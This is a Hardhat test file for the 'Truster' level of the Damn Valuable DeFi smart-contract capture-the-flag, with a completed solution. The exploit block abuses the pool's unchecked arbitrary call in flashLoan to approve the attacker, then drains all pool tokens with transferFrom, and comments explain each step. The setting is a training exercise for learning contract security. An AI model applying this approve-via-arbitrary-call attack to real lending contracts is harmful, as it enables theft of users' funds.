const { ethers } = require("hardhat")
const { expect } = require("chai")

describe("[Challenge] Truster", function () {
  let deployer, attacker

  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000")

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    ;[deployer, attacker] = await ethers.getSigners()

    const DamnValuableToken = await ethers.getContractFactory(
      "DamnValuableToken",
      deployer
    )
    const TrusterLenderPool = await ethers.getContractFactory(
      "TrusterLenderPool",
      deployer
    )

    this.token = await DamnValuableToken.deploy()
    this.pool = await TrusterLenderPool.deploy(this.token.address)

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL)

    expect(await this.token.balanceOf(this.pool.address)).to.equal(
      TOKENS_IN_POOL
    )

    expect(await this.token.balanceOf(attacker.address)).to.equal("0")
  })

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE  */
    // Sending 0 tokens into the flashLoan
    // Also exploiting the factthat flashLoan is not checking for borrower

    let ABI = [
      "function approve(address spender,uint256 amount) returns (bool)",
    ]
    let iface = new ethers.utils.Interface(ABI)
    let data = iface.encodeFunctionData("approve", [
      attacker.address,
      TOKENS_IN_POOL,
    ])

    await this.pool.flashLoan(0, attacker.address, this.token.address, data)
    // when executing data, I'm sending the target address as the  token addrerss
    // in the token address, I'm asking to approve attacker address to spend the tokens
    // since the callFunction is called from within the trustedLenderPool contract -> who is the rightful owner
    // low level callFunction will successfully approve
    // once approved, next step is to transfer tokens to attacker address

    await this.token
      .connect(attacker)
      .transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
  })

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(attacker.address)).to.equal(
      TOKENS_IN_POOL
    )
    expect(await this.token.balanceOf(this.pool.address)).to.equal("0")
  })
})
